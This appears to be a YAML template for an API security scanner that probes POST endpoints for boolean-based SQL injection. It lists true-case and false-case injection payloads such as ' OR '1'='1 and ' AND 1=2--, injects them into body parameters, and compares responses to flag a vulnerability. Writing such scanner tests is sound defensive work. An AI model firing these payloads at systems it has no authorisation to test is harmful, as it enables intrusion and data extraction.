id: BOOLEAN_BASED_SQLI_POST
info:
  name: "Boolean based SQL Injection test on POST method APIs"
  description: "The Boolean-Based SQL Injection Test on POST Method APIs examines whether an attacker can manipulate SQL queries by injecting boolean expressions (e.g., `AND 1=1` or `AND 1=2`) into POST request parameters. This technique does not return immediate errors but allows attackers to infer information about the database structure based on the applicationâ€™s response to different inputs. By exploiting the lack of proper input validation, attackers can extract sensitive information or manipulate the database. Proper input sanitization and error handling can help prevent such attacks."
  details: " The Boolean-Based SQL Injection Test on POST Method APIs involves injecting boolean expressions into input fields of POST requests to manipulate SQL queries. These expressions, such as `AND 1=1` or `AND 1=2`, trigger different responses depending on the validity of the query, allowing attackers to deduce database information like table names or column structures. This technique works without producing immediate errors, making it harder to detect but still dangerous. Protecting against it requires implementing robust input validation, parameterized queries, and careful handling of database errors."
  impact: "The impact of the Boolean-Based SQL Injection Test on POST Method APIs can be significant, as it allows attackers to slowly extract sensitive data or infer the structure of the database through subtle differences in application responses. While it may not immediately expose data, it can lead to unauthorized access, data leakage, or further exploitation of vulnerabilities. Additionally, attackers can escalate their access by crafting more complex queries based on the information obtained. Proper input sanitization, error handling, and parameterized queries are essential to mitigate such risks."
  category:
    name: NO_AUTH
    shortName: Broken Authentication
    displayName: Broken User Authentication (BUA)
  subCategory: BOOLEAN_BASED_SQLI_POST
  severity: MEDIUM
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
  cwe:
    - CWE-287
  cve:
    - CVE-2020-24008
    - CVE-2021-45901

attributes:
  nature: INTRUSIVE
  plan: PRO
  duration: FAST


api_selection_filters:
  response_code:
    gte: 200
    lt: 300
  method:
    eq: "POST"
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
      - <html>
      - </html>

  request_payload:
    for_one:
      key:
        regex: ".*"
        extract: userKey
      value:
        extract: userVal
wordLists:
  trueCasePayloads:
    - "' OR '1'='1"
    - "\" OR \"1\"=\"1"
    - "') OR ('1'='1"
    - "') OR '1'='1'--"
    - "\" OR \"1\"=\"1\"--"
    - "' OR 1=1--"
    - "\" OR 1=1--"
    - "') OR 1=1--"
    - "') OR ('a'='a"
    - "') OR 'a'='a'--"
    - "\" OR \"a\"=\"a\""
    - "\" OR \"a\"=\"a\"--"
  falseCasePayloads:
    - "' AND '1'='2"
    - "\" AND \"1\"=\"2"
    - "') AND ('1'='2"
    - "') AND '1'='2'--"
    - "\" AND \"1\"=\"2\"--"
    - "' AND 1=2--"
    - "\" AND 1=2--"
    - "') AND 1=2--"
    - "') AND ('a'='b"
    - "') AND 'a'='b'--"
    - "\" AND \"a\"=\"b\""
    - "\" AND \"a\"=\"b\"--"
execute:
  type: multiple
  requests:
    - req:
        - modify_body_param:
            userKey: ${userVal}${falseCasePayloads}
        - validate:
            or:
              - response_code:
                  gte: 400
                  lt: 410
              - response_payload:
                  not_contains:
                    - Error
                    - fail
                    - invalid
                    - expired
                    - not found
                    - account is locked
                    - account is blocked
                    - rate-limit
                    - rate_limit
                    - rate limit
                    - multiple failed attempt
                    - Attention Required!
                    - CloudFlare
                    - Sorry, you have been blocked
                    - " AND "
                    - "="
                    - "--"
        - success: x2
        - failure: exit
    - req:
        - modify_body_param:
            userKey: ${userVal}${trueCasePayloads}
        - validate:
            response_code:
              gte: 200
              lt: 300
            response_payload:
              length:
                gt: 0
              neq_obj: "${x1.response.body}"
              not_contains:
                - rate-limit
                - rate limit
                - rate_limit
                - account is locked
                - account is blocked
                - multiple failed attempt
                - Attention Required!
                - CloudFlare
                - Sorry, you have been blocked
                - " OR "
                - " AND "
                - "="
                - "--"
                - "fail"
                - "invalid"
                - <html>
                - </html>
        - success: x3
        - failure: exit
    - req:
        - add_header:
            dummyHeader: dummyValue
        - modify_body_param:
            userKey: ${userVal}${trueCasePayloads}
        - validate:
            response_code:
              gte: 200
              lt: 300
            response_payload:
              length:
                gt: 0
              eq_obj: "${x2.response.body}"
              not_contains:
                - rate-limit
                - rate limit
                - rate_limit
                - account is locked
                - account is blocked
                - multiple failed attempt
                - Attention Required!
                - CloudFlare
                - Sorry, you have been blocked
                - " OR "
                - " AND "
                - "="
                - "--"
                - "fail"
                - "invalid"
                - <html>
                - </html>
        - success: vulnerable
        - failure: exit
